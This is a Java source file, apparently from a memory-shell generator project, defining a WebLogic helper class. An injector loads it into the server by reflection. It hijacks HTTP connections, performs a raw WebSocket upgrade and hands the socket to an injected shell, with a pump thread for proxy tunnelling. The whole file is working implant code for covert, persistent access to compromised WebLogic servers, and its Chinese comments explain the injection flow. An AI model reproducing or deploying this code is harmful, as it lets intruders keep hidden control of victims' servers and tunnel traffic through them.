package com.reajason.javaweb.memshell.server.weblogic;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;

/**
 * WebLogic RawWebSocket helper 模板。
 * <p>
 * 生成期由 server 按 {@code &lt;shellClassName&gt;$RawWsHelper} 重命名并嵌入注入器；注入器先
 * defineClass 本类，再实例化 shell。shell 每次握手创建一个 helper 实例，调用
 * {@code helper.equals(new Object[]{request, response, this})} 后由本类接管连接。
 * <p>
 * WebLogic 的 {@code ServletResponseImpl.getSocket()} 会先以当前状态码和响应头写出响应
 * （101 由本类在调用前设置），再把输出流切到 native controls pipe；此后容器不会再写任何
 * 字节，连接归应用所有。NIO/NIO2 连接器下 socket 的流由 WebLogic 的
 * {@code NIOInputStream} / {@code NIOOutputStream} 实现，BIO 连接器下就是普通 socket 流，
 * 因此两种连接器共用同一条读写路径。
 * <p>
 * 本类只依赖 JDK（目标 JDK 6），不引用任何 servlet / WebLogic 类型，javax 与 jakarta
 * 两种命名空间共用同一份代码。
 *
 * @author ReaJason
 */
public class WebLogicRawWsHelper implements Runnable {

    private static final String GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    private static final Charset UTF8 = Charset.forName("UTF8");
    private static final int MAX_MESSAGE_SIZE = 50 * 1024 * 1024;
    private static final int OP_CONT = 0x0;
    private static final int OP_TEXT = 0x1;
    private static final int OP_BINARY = 0x2;
    private static final int OP_CLOSE = 0x8;
    private static final int OP_PING = 0x9;
    private static final int OP_PONG = 0xA;

    /**
     * 阻塞读的超时：连接空闲时定期醒来检查 closed，让泵线程关闭的连接能退出帧循环。
     */
    private static final int READ_POLL_TIMEOUT = 5000;
    private static final int IO_BUFFER_SIZE = 8192;

    private final byte[] singleByte = new byte[1];
    /**
     * 已从连接读出但尚未消费的字节。帧头和掩码按单字节读取，一次读满内部缓冲后
     * 再逐字节消费，避免每个字节都触发一次 socket read。
     */
    private byte[] pending;
    private int pendingIndex;
    private int pendingLength;

    private Socket socket;
    private InputStream input;
    private OutputStream output;

    private final Object writeLock = new Object();
    private volatile boolean closed;
    private Object shell;
    private Method onStart;
    private Method onReadBinary;
    private Method onReadText;
    private Method onDisconnect;
    private InputStream pumpInput;
    private Map attributes;
    private boolean hijacked;

    public WebLogicRawWsHelper() {
    }

    /**
     * 注入器到 helper 的唯一入口。返回 true 表示连接已被接管（101 已决定写或已写），
     * 调用方不能再回落到 FilterChain；返回 false 表示尚未接管，可安全 fallback。
     */
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length != 3) {
            return false;
        }
        try {
            return connect(args[0], args[1], args[2]);
        } catch (Throwable ignored) {
            return hijacked;
        }
    }

    private boolean connect(Object request, Object response, Object shellObject) throws Exception {
        Object key = invoke(request, "getHeader", new Class[]{String.class}, new Object[]{"Sec-WebSocket-Key"});
        Object method = invoke(request, "getMethod", new Class[0], null);
        if (!(key instanceof String) || !"GET".equalsIgnoreCase(String.valueOf(method))) {
            return false;
        }
        String accept = acceptKey((String) key);
        if (accept == null) {
            return false;
        }
        if (isTrue(invoke(request, "isSecure", new Class[0], null))) {
            return false;
        }
        // 只接管 WebLogic 自己的响应；被包装过的响应查不到 getSocket 时安全回落到 FilterChain
        Method getSocket = findMethod(response, "getSocket", new Class[0]);
        if (getSocket == null) {
            return false;
        }

        // 101 与握手头必须在 getSocket() 之前设置：getSocket() 内部会把它们写出去
        invoke(response, "setStatus", new Class[]{int.class}, new Object[]{Integer.valueOf(101)});
        invoke(response, "setHeader", new Class[]{String.class, String.class},
                new Object[]{"Upgrade", "websocket"});
        invoke(response, "addHeader", new Class[]{String.class, String.class},
                new Object[]{"Connection", "Upgrade"});
        invoke(response, "setHeader", new Class[]{String.class, String.class},
                new Object[]{"Sec-WebSocket-Accept", accept});

        // 从这里开始响应可能已经写出 101，任何失败都只能关闭连接，不能再回落
        this.hijacked = true;
        Object socketObject;
        try {
            socketObject = getSocket.invoke(response);
        } catch (Throwable t) {
            closeConnection();
            return true;
        }
        if (!(socketObject instanceof Socket)) {
            closeConnection();
            return true;
        }

        // 先赋给字段再初始化：getSocket() 已把连接从容器摘除，之后任何异常都必须
        // 能经 closeConnection() 关掉它，否则每次失败泄露一个 FD
        Socket socket = (Socket) socketObject;
        this.socket = socket;
        try {
            socket.setSoTimeout(READ_POLL_TIMEOUT);
            this.input = socket.getInputStream();
            this.output = socket.getOutputStream();
        } catch (Throwable t) {
            closeConnection();
            return true;
        }
        // NIO 连接器的响应头会先攒在 GatheringChunkOutput 里等第一次写出；getSocket()
        // 切走输出流后不会再有人写它，这里显式把 101 刷到 socket。
        flushStagedHeaders(response);

        this.shell = shellObject;
        this.onStart = findMethod(shellObject, "onStart", new Class[]{Object.class});
        this.onReadBinary = findMethod(shellObject, "onReadBinary", new Class[]{Object.class, byte[].class});
        this.onReadText = findMethod(shellObject, "onReadText", new Class[]{Object.class, String.class});
        this.onDisconnect = findMethod(shellObject, "onDisconnect", new Class[]{Object.class});

        invokeQuietly(onStart, shell, new Object[]{this});
        try {
            frameLoop();
        } catch (Throwable ignored) {
        } finally {
            invokeQuietly(onDisconnect, shell, new Object[]{this});
            closeConnection();
        }
        return true;
    }

    // ---------------------------------------------------------------- 连接接管

    /**
     * getSocket() 只保证响应头写进了输出缓冲：NIO 下 GatheringChunkOutput 要等第一次
     * flush/write 才真正发给客户端，而 native controls pipe 已经把 servlet 输出流换走。
     */
    private void flushStagedHeaders(Object response) {
        try {
            Object outputStream = invoke(response, "getServletOutputStream", new Class[0], null);
            Object wrapper = getField(outputStream, "co");
            Object realOutput = getField(wrapper, "realChunkOutput");
            if (realOutput != null) {
                invoke(realOutput, "flush", new Class[0], null);
            }
        } catch (Throwable ignored) {
        }
    }

    // ---------------------------------------------------------------- 原始字节读写

    private int readWire(byte[] buffer, int offset, int length) throws IOException {
        if (length <= 0) {
            return 0;
        }
        // 帧头和掩码按单字节读取；一次读满内部缓冲后再逐字节消费，避免每个字节一次
        // socket read。payload 等大块读取直接落到调用方缓冲区。
        if (pendingIndex >= pendingLength && length == 1) {
            if (pending == null || pending.length < IO_BUFFER_SIZE) {
                pending = new byte[IO_BUFFER_SIZE];
            }
            int count = readWireDirect(pending, 0, pending.length);
            if (count <= 0) {
                return count;
            }
            pendingLength = count;
            pendingIndex = 0;
        }
        if (pendingIndex < pendingLength) {
            int count = pendingLength - pendingIndex;
            if (count > length) {
                count = length;
            }
            System.arraycopy(pending, pendingIndex, buffer, offset, count);
            pendingIndex += count;
            return count;
        }
        return readWireDirect(buffer, offset, length);
    }

    private int readWireDirect(byte[] buffer, int offset, int length) throws IOException {
        while (!closed) {
            try {
                return input.read(buffer, offset, length);
            } catch (SocketTimeoutException e) {
                // 空闲超时只是轮询点，连接仍然有效
                continue;
            } catch (Throwable t) {
                if (closed) {
                    return -1;
                }
                if (t instanceof IOException) {
                    throw (IOException) t;
                }
                throw new IOException("read failed: " + t);
            }
        }
        return -1;
    }

    private int readWireByte() throws IOException {
        while (!closed) {
            int count = readWire(singleByte, 0, 1);
            if (count > 0) {
                return singleByte[0] & 0xFF;
            }
            if (count < 0) {
                return -1;
            }
        }
        return -1;
    }

    private void readFully(byte[] buffer, int offset, int length) throws IOException {
        int read = 0;
        while (read < length) {
            int count = readWire(buffer, offset + read, length - read);
            if (count < 0) {
                throw new IOException("unexpected EOF");
            }
            if (count == 0) {
                if (closed) {
                    throw new IOException("connection closed");
                }
                continue;
            }
            read += count;
        }
    }

    /**
     * 分块读取并解掩码：按声明长度一次性分配大数组会被畸形帧头打爆内存；
     * 掩码按全局偏移对齐，length 为 0 时返回空数组。
     */
    private byte[] readMaskedPayload(long length, byte[] mask) throws IOException {
        int total = (int) length;
        int chunkSize = Math.min(total, IO_BUFFER_SIZE);
        ByteArrayOutputStream out = new ByteArrayOutputStream(chunkSize);
        byte[] chunk = new byte[chunkSize];
        int received = 0;
        while (received < total) {
            int n = Math.min(chunkSize, total - received);
            readFully(chunk, 0, n);
            for (int i = 0; i < n; i++) {
                chunk[i] = (byte) (chunk[i] ^ mask[(received + i) % 4]);
            }
            out.write(chunk, 0, n);
            received += n;
        }
        return out.toByteArray();
    }

    private void writeWire(byte[] data, int offset, int length) throws IOException {
        if (length <= 0) {
            return;
        }
        OutputStream stream = output;
        if (stream == null) {
            throw new IOException("connection closed");
        }
        stream.write(data, offset, length);
    }

    /**
     * 整帧写完只 flush 一次；header 与 payload 之间的 flush 只是多一次系统调用。
     */
    private void flushWire() {
        OutputStream stream = output;
        if (stream != null) {
            try {
                stream.flush();
            } catch (Throwable ignored) {
            }
        }
    }

    private void closeConnection() {
        if (closed) {
            return;
        }
        closed = true;
        try {
            if (input != null) {
                input.close();
            }
        } catch (Throwable ignored) {
        }
        try {
            if (output != null) {
                output.close();
            }
        } catch (Throwable ignored) {
        }
        try {
            if (socket != null) {
                socket.close();
            }
        } catch (Throwable ignored) {
        }
        this.input = null;
        this.output = null;
        this.socket = null;
    }

    // ---------------------------------------------------------------- 协议

    private void frameLoop() {
        ByteArrayOutputStream fragments = null;
        int fragmentOpcode = -1;
        try {
            while (!closed) {
                int b1 = readWireByte();
                if (b1 == -1) {
                    break;
                }
                boolean fin = (b1 & 0x80) != 0;
                int opcode = b1 & 0x0F;
                if ((b1 & 0x70) != 0) {
                    closeWith(1002, "unexpected reserved bits");
                    return;
                }

                int b2 = readWireByte();
                if (b2 == -1) {
                    break;
                }
                boolean masked = (b2 & 0x80) != 0;
                long length = b2 & 0x7F;
                if (length == 126) {
                    int hi = readWireByte();
                    int lo = readWireByte();
                    if (hi < 0 || lo < 0) {
                        return;
                    }
                    length = (hi << 8) | lo;
                } else if (length == 127) {
                    length = 0;
                    for (int i = 0; i < 8; i++) {
                        int b = readWireByte();
                        if (b < 0) {
                            return;
                        }
                        length = (length << 8) | b;
                    }
                }
                if (length < 0 || length > MAX_MESSAGE_SIZE) {
                    closeWith(1009, "message too big");
                    return;
                }
                if (!masked) {
                    closeWith(1002, "client frame must be masked");
                    return;
                }
                if (opcode >= 0x8 && (!fin || length > 125)) {
                    closeWith(1002, "invalid control frame");
                    return;
                }

                byte[] mask = new byte[4];
                readFully(mask, 0, mask.length);
                byte[] message = readMaskedPayload(length, mask);

                if (opcode == OP_CLOSE) {
                    // RFC 6455 §5.5：Close 体长度只能是 0 或 >=2，1 字节是协议错误
                    if (message.length == 1) {
                        closeWith(1002, "invalid close frame");
                        return;
                    }
                    sendFrame(OP_CLOSE, message);
                    closeConnection();
                    return;
                }
                if (opcode == OP_PING) {
                    sendFrame(OP_PONG, message);
                    continue;
                }
                if (opcode == OP_PONG) {
                    continue;
                }
                if (opcode == OP_CONT) {
                    if (fragments == null) {
                        closeWith(1002, "unexpected continuation");
                        return;
                    }
                    fragments.write(message);
                    if (fragments.size() > MAX_MESSAGE_SIZE) {
                        closeWith(1009, "message too big");
                        return;
                    }
                    if (fin) {
                        dispatch(fragmentOpcode, fragments.toByteArray());
                        fragments = null;
                        fragmentOpcode = -1;
                    }
                    continue;
                }
                if (opcode == OP_TEXT || opcode == OP_BINARY) {
                    if (fragments != null) {
                        closeWith(1002, "expected continuation");
                        return;
                    }
                    if (fin) {
                        dispatch(opcode, message);
                    } else {
                        fragmentOpcode = opcode;
                        fragments = new ByteArrayOutputStream();
                        fragments.write(message);
                    }
                    continue;
                }
                closeWith(1002, "unknown opcode");
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    private void dispatch(int opcode, byte[] message) {
        if (opcode == OP_TEXT) {
            invokeQuietly(onReadText, shell, new Object[]{this, new String(message, UTF8)});
        } else {
            invokeQuietly(onReadBinary, shell, new Object[]{this, message});
        }
    }

    public void sendText(String text) {
        sendFrame(OP_TEXT, text.getBytes(UTF8));
    }

    public void sendBinary(byte[] data) {
        sendFrame(OP_BINARY, data);
    }

    /**
     * 供壳主动结束会话（如代理建连失败）：发送 Close 帧并释放底层连接。
     */
    public void close() {
        closeWith(1000, null);
    }

    private void sendFrame(int opcode, byte[] data) {
        synchronized (writeLock) {
            if (closed) {
                return;
            }
            try {
                int length = data.length;
                byte[] header;
                if (length <= 125) {
                    header = new byte[]{0, (byte) length};
                } else if (length <= 0xFFFF) {
                    header = new byte[]{0, 126, (byte) ((length >>> 8) & 0xFF), (byte) (length & 0xFF)};
                } else {
                    header = new byte[10];
                    header[1] = 127;
                    for (int i = 0; i < 8; i++) {
                        header[9 - i] = (byte) (((long) length >>> (8 * i)) & 0xFF);
                    }
                }
                header[0] = (byte) (0x80 | opcode);
                writeWire(header, 0, header.length);
                writeWire(data, 0, data.length);
                flushWire();
            } catch (Throwable t) {
                closeConnection();
            }
        }
    }

    private void closeWith(int code, String reason) {
        byte[] reasonBytes = reason == null ? new byte[0] : reason.getBytes(UTF8);
        byte[] data = new byte[2 + reasonBytes.length];
        data[0] = (byte) ((code >>> 8) & 0xFF);
        data[1] = (byte) (code & 0xFF);
        System.arraycopy(reasonBytes, 0, data, 2, reasonBytes.length);
        sendFrame(OP_CLOSE, data);
        closeConnection();
    }

    public Object getAttribute(String name) {
        Map map = attributes;
        return map == null ? null : map.get(name);
    }

    public void setAttribute(String name, Object value) {
        if (attributes == null) {
            attributes = new HashMap();
        }
        if (value == null) {
            attributes.remove(name);
        } else {
            attributes.put(name, value);
        }
    }

    /**
     * 为 Proxy 壳提供目标端到客户端的异步泵送。帧循环占用当前请求线程，
     * 与 Tomcat helper 一致；本类的 Runnable 身份留给泵线程。
     */
    public void startPump(InputStream targetInput) {
        if (targetInput == null) {
            return;
        }
        this.pumpInput = targetInput;
        Thread thread = new Thread(this, "rawws-pump");
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    @Override
    public void run() {
        InputStream targetInput = pumpInput;
        if (targetInput == null) {
            return;
        }
        byte[] buffer = new byte[8192];
        try {
            while (!closed) {
                int count = targetInput.read(buffer);
                if (count == -1) {
                    break;
                }
                if (count > 0) {
                    byte[] data = new byte[count];
                    System.arraycopy(buffer, 0, data, 0, count);
                    sendBinary(data);
                }
            }
        } catch (Throwable ignored) {
        }
        closeWith(1000, null);
    }

    // ---------------------------------------------------------------- 反射工具

    private static Object getField(Object target, String name) {
        if (target == null) {
            return null;
        }
        Class<?> clazz = target.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return null;
            }
        }
        return null;
    }

    private static Object invoke(Object target, String name, Class[] parameterTypes, Object[] args) {
        if (target == null) {
            return null;
        }
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (InvocationTargetException e) {
            return null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Method findMethod(Object target, String name, Class[] parameterTypes) {
        try {
            return target.getClass().getMethod(name, parameterTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void invokeQuietly(Method method, Object target, Object[] args) {
        if (method == null) {
            return;
        }
        try {
            method.invoke(target, args);
        } catch (Throwable ignored) {
        }
    }

    private static boolean isTrue(Object value) {
        return Boolean.TRUE.equals(value);
    }

    private static String acceptKey(String key) {
        try {
            MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
            return base64Encode(sha1.digest((key + GUID).getBytes(UTF8)));
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String base64Encode(byte[] data) {
        try {
            Class<?> base64Class = Class.forName("java.util.Base64");
            Object encoder = base64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, new Object[]{data});
        } catch (Throwable ignored) {
        }
        try {
            Class<?> encoderClass = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = encoderClass.newInstance();
            String value = (String) encoderClass.getMethod("encode", byte[].class)
                    .invoke(encoder, new Object[]{data});
            return value.replace("\n", "").replace("\r", "");
        } catch (Throwable ignored) {
            return null;
        }
    }
}
